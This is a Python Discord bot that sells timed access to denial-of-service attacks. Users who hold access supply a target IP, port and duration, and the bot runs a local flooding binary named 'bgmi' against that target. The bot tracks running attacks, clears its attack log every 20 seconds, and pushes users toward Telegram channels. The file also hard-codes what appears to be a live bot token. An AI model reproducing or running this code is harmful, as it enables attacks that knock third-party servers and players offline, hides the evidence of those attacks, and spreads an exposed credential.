import os
import discord
from discord.ext import commands, tasks
import asyncio
import logging
import subprocess
import re
from datetime import datetime, timedelta
import time
from discord.ui import Button, View
from threading import Thread

# Initialize event loop
loop = asyncio.get_event_loop()

TOKEN = 'MTI3Mjg1NjMyMjAwMTQ2OTU1Mg.GnWq2D.vPsGk49h3wvb0ZouqQDIs5qCU3Fa2Y939Znw10'  # Replace with your actual Discord bot token

logging.basicConfig(filename='attack_logs.txt', format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Discord Bot Setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

COMMAND_COOLDOWN = 5  # Cooldown period for command spamming
USER_CHECK_INTERVAL = 60  # Interval to check user expiry times in seconds

# List of admin IDs
ADMIN_IDS = {1175764273562124320, 123456789012345678, 987654321098765432}  # Replace with actual admin user IDs

# Blocked ports
blocked_ports = {8700, 20000, 443, 17500, 9031, 20002, 20001}

# Dictionary to keep track of running processes and authorized users
running_processes = {}
authorized_users = {}
command_cooldowns = {}

users_file = 'users.txt'

# Flag to check if the task is already running
reset_attack_logs_started = False


class JoinedButton(Button):
    def __init__(self):
        super().__init__(label="Joined", style=discord.ButtonStyle.success)

    async def callback(self, interaction: discord.Interaction):
        await interaction.message.delete()
        await interaction.response.send_message(
            "Welcome to the server! You can use the following commands:\n"
            "`!attack`: Start an attack (if authorized)\n"
            "`!add`: Add a user (admin only)\n"
            "`!remove`: Remove a user (admin only)\n"
            "`!id`: Get your Discord ID\n"
            "`!running`: List running attacks\n"
            "`!cancel`: Cancel your ongoing attack",
            ephemeral=True  # Sends the message privately to the user
        )

def is_valid_ip(ip):
    # Simple IP validation
    pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    return pattern.match(ip) is not None

def is_positive_integer(value):
    return value.isdigit() and int(value) > 0

async def notify_user(ctx, message):
    await ctx.send(message)

def run_attack_command(user_id, ip, port, duration, ctx):
    # Use absolute path for bgmi
    bgmi_path = os.path.abspath('./bgmi')
    command = f"{bgmi_path} {user_id} {ip} {port} {duration}"

    try:
        logging.info(f"Attempting to execute command: {command}")
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        running_processes[user_id] = process

        time.sleep(duration)  # Wait for the duration of the attack

        if process.poll() is None:
            process.terminate()
            process.wait()

        stdout, stderr = process.communicate()

        if stderr:
            logging.error(f"Error executing command for {user_id}: {stderr.decode()}")
            asyncio.run_coroutine_threadsafe(notify_user(ctx, f"Error executing attack: {stderr.decode()}"), loop)
        else:
            logging.info(f"Command executed successfully for {user_id}: {stdout.decode()}")
            asyncio.run_coroutine_threadsafe(notify_user(ctx, f"Attack finished for User: {user_id}"), loop)

    except Exception as e:
        logging.error(f"Failed to execute command for {user_id}: {e}")
        asyncio.run_coroutine_threadsafe(notify_user(ctx, f"Failed to execute attack: {str(e)}"), loop)

    finally:
        running_processes.pop(user_id, None)

async def process_attack_command(ctx, message_content):
    user_id = str(ctx.author.id)
    
    if user_id not in authorized_users or datetime.now() > authorized_users[user_id]:
        await ctx.send("You are not authorized to use the attack command or your authorization has expired.")
        return

    args = message_content.split()
    if len(args) != 3:
        await ctx.send("Invalid command format. Please use: target_ip target_port duration")
        return

    target_ip, target_port, duration = args[0], args[1], args[2]

    if not is_valid_ip(target_ip):
        await ctx.send("Invalid IP address format. Please provide a valid IP.")
        return

    if not is_positive_integer(target_port):
        await ctx.send("Invalid port. Please provide a positive integer for the port.")
        return

    target_port = int(target_port)

    if target_port in blocked_ports:
        await ctx.send(f"Port {target_port} is blocked. Please use a different port.")
        return

    if not is_positive_integer(duration):
        await ctx.send("Invalid duration. Please provide a positive integer for duration.")
        return

    duration = int(duration)

    # Start the attack in a separate thread to keep the bot responsive
    attack_thread = Thread(target=run_attack_command, args=(user_id, target_ip, target_port, duration, ctx))
    attack_thread.start()

    await ctx.send(f"Attack started 💥\n\nUser: {user_id}\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds")

@bot.event
async def on_ready():
    global reset_attack_logs_started

    print(f'{bot.user.name} has connected to Discord!')
    load_authorized_users()
    bot.loop.create_task(check_user_expirations())

    # Start reset_attack_logs only once
    if not reset_attack_logs_started:
        reset_attack_logs.start()
        reset_attack_logs_started = True

@bot.command(name='attack')
async def attack_command(ctx):
    user_id = str(ctx.author.id)

    if user_id not in authorized_users:
        await ctx.send("You are not authorized to use this command.")
        return

    if datetime.now() > authorized_users[user_id]:
        await ctx.send("Your authorization to use this command has expired.")
        del authorized_users[user_id]
        save_authorized_users()
        return

    if user_id in running_processes:
        await ctx.send("You already have an ongoing attack. Please wait until it's finished.")
        return

    if user_id in command_cooldowns and time.time() < command_cooldowns[user_id]:
        remaining_time = int(command_cooldowns[user_id] - time.time())
        await ctx.send(f"Please wait {remaining_time} seconds before sending the same command again.")
        return

    await ctx.send("Enter the target IP, port, and duration (in seconds) separated by spaces.")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel
    
    try:
        msg = await bot.wait_for('message', timeout=30.0, check=check)
        if msg.content and msg.channel == ctx.channel:
            await process_attack_command(ctx, msg.content)
    except asyncio.TimeoutError:
        await ctx.send("You took too long to respond.")
    
    command_cooldowns[user_id] = time.time() + COMMAND_COOLDOWN

@bot.command(name='add')
async def add_user(ctx):
    if ctx.author.id not in ADMIN_IDS:
        await ctx.send("You do not have permission to use this command. Only authorized admins can use it.")
        return

    await ctx.send("Please provide the user ID to authorize.")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel
    
    try:
        user_id_msg = await bot.wait_for('message', timeout=30.0, check=check)
        user_id = user_id_msg.content.strip()

        if not user_id.isdigit():
            await ctx.send("Invalid user ID format. Please provide a valid numeric user ID.")
            return

        user_id = str(user_id)
        await ctx.send("Please provide the duration for the authorization (e.g., '1h', '1d').")
        duration_msg = await bot.wait_for('message', timeout=30.0, check=check)
        duration_str = duration_msg.content.strip()

        expiry_time = parse_duration(duration_str)
        if expiry_time is None:
            await ctx.send("Invalid duration format. Use '1d', '2d', '1h', '2h' or a specific date 'YYYY-MM-DD HH:MM'.")
            return

        # Add or update the user in the dictionary and save to file
        authorized_users[user_id] = expiry_time
        save_authorized_users()

        remaining_time = expiry_time - datetime.now()
        remaining_time_str = str(remaining_time).split('.')[0]  # Format remaining time as HH:MM:SS

        await ctx.send(f"This User {user_id} added for {remaining_time_str}.")
    except asyncio.TimeoutError:
        await ctx.send("You took too long to respond.")

@bot.command(name='remove')
async def remove_user(ctx):
    if ctx.author.id not in ADMIN_IDS:
        await ctx.send("You do not have permission to use this command. Only authorized admins can use it.")
        return

    await ctx.send("Please provide the user ID to remove.")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel
    
    try:
        user_id_msg = await bot.wait_for('message', timeout=30.0, check=check)
        user_id = user_id_msg.content.strip()

        if not user_id.isdigit():
            await ctx.send("Invalid user ID format. Please provide a valid numeric user ID.")
            return

        user_id = str(user_id)

        if user_id in authorized_users:
            del authorized_users[user_id]
            save_authorized_users()
            await ctx.send(f"User {user_id} has been removed from the authorized list.")
        else:
            await ctx.send(f"User {user_id} is not in the authorized list.")
    except asyncio.TimeoutError:
        await ctx.send("You took too long to respond.")

@bot.command(name='list')
async def list_users(ctx):
    if ctx.author.id not in ADMIN_IDS:
        await ctx.send("You do not have permission to use this command. Only authorized admins can use it.")
        return

    if authorized_users:
        user_list = "\n".join([f"User: {user_id}, Expiry: {expiry_time.strftime('%Y-%m-%d %H:%M:%S')}" for user_id, expiry_time in authorized_users.items()])
        await ctx.send(f"Authorized users:\n{user_list}")
    else:
        await ctx.send("No users are currently authorized.")

@bot.command(name='myinfo')
async def my_info(ctx):
    user_id = str(ctx.author.id)
    if user_id in authorized_users:
        expiry_time = authorized_users[user_id]
        remaining_time = expiry_time - datetime.now()
        remaining_time_str = str(remaining_time).split('.')[0]  # Format remaining time as HH:MM:SS
        await ctx.send(f"Your authorization is valid until {expiry_time.strftime('%Y-%m-%d %H:%M:%S')} ({remaining_time_str} remaining).")
    else:
        await ctx.send("You are not authorized to use the bot.")

@bot.command(name='id')
async def get_discord_id(ctx):
    user_id = str(ctx.author.id)
    await ctx.send(f"Your Discord ID is: {user_id}")

@bot.command(name='running')
async def list_running_attacks(ctx):
    if running_processes:
        running_attacks = "\n".join([f"User: {user_id}, Process: {process.pid}" for user_id, process in running_processes.items()])
        await ctx.send(f"Currently running attacks:\n{running_attacks}")
    else:
        await ctx.send("No attacks are currently running.")

@bot.command(name='cancel')
async def cancel_attack(ctx):
    user_id = str(ctx.author.id)

    if user_id in running_processes:
        process = running_processes[user_id]
        if process.poll() is None:  # Check if the process is still running
            process.terminate()
            process.wait()  # Ensure the process has terminated
        await ctx.send("Your attack has been cancelled.")
    else:
        await ctx.send("You don't have any running attacks to cancel.")

@bot.command(name='start')
async def send_welcome(ctx):
    user = str(ctx.author)

    # Create the embed for channels and the "Joined" button
    embed = discord.Embed(
        title=f"Welcome, {user}!",
        description=(
            "To use this bot, please join our channels:\n"
            "1. [Channel 1](https://t.me/aesthecticmods)\n"
            "2. [Channel 2](https://t.me/+iwSShymmi5xiMWNl)\n"
            "3. [Channel 3](https://t.me/+iwSShymmi5xiMWNl)\n\n"
            "After joining, click 'Joined' to continue."
        ),
        color=discord.Color.blue()
    )
    
    view = View()
    view.add_item(Button(label="Join Channel 1", url="https://t.me/aesthecticmods"))
    view.add_item(Button(label="Join Channel 2", url="https://t.me/+iwSShymmi5xiMWNl"))
    view.add_item(Button(label="Join Channel 3", url="https://t.me/+iwSShymmi5xiMWNl"))
    view.add_item(JoinedButton())
    
    await ctx.send(embed=embed, view=view)

def parse_duration(duration_str):
    now = datetime.now()

    if re.match(r'^\d+[hH]$', duration_str):
        hours = int(re.search(r'\d+', duration_str).group())
        return now + timedelta(hours=hours)

    if re.match(r'^\d+[dD]$', duration_str):
        days = int(re.search(r'\d+', duration_str).group())
        return now + timedelta(days=days)

    if re.match(r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}', duration_str):
        try:
            return datetime.strptime(duration_str, '%Y-%m-%d %H:%M')
        except ValueError:
            return None

    return None

def load_authorized_users():
    global authorized_users
    if os.path.exists(users_file):
        with open(users_file, 'r') as file:
            for line in file:
                user_id, expiry_time_str = line.strip().split(',')
                expiry_time = datetime.strptime(expiry_time_str, '%Y-%m-%d %H:%M:%S')
                authorized_users[user_id] = expiry_time

def save_authorized_users():
    with open(users_file, 'w') as file:
        for user_id, expiry_time in authorized_users.items():
            file.write(f"{user_id},{expiry_time.strftime('%Y-%m-%d %H:%M:%S')}\n")

@tasks.loop(seconds=20)
async def reset_attack_logs():
    try:
        open('attack_logs.txt', 'w').close()  # Clear the log file
        logging.info("Attack logs reset.")
    except Exception as e:
        logging.error(f"Failed to reset attack logs: {e}")

async def check_user_expirations():
    while True:
        now = datetime.now()
        expired_users = [user_id for user_id, expiry_time in authorized_users.items() if now > expiry_time]
        
        for user_id in expired_users:
            del authorized_users[user_id]

        save_authorized_users()
        await asyncio.sleep(USER_CHECK_INTERVAL)

bot.run(TOKEN)
